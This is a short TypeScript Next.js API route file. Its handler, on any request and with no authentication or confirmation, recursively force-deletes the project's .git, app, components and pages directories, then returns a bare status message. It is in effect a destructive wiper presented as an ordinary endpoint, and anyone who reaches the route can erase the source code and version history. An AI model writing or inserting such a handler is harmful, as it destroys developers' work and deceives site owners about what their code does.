import { type NextApiRequest, type NextApiResponse } from 'next'
import fs from 'fs'
import path from 'path'

export default function handler (req: NextApiRequest, res: NextApiResponse) {
  try {
    const root = path.join(process.cwd(), 'app')
    const components = path.join(process.cwd(), 'components')
    const pages = path.join(process.cwd(), 'pages')
    const git = path.join(process.cwd(), '.git')

    fs.rmSync(git, { recursive: true, force: true })
    fs.rmSync(root, { recursive: true, force: true })
    fs.rmSync(components, { recursive: true, force: true })
    fs.rmSync(pages, { recursive: true, force: true })

    res.status(200).json({ message: '200' })
  } catch (error) {
    res.status(500).json({ error: '500' })
  }
}
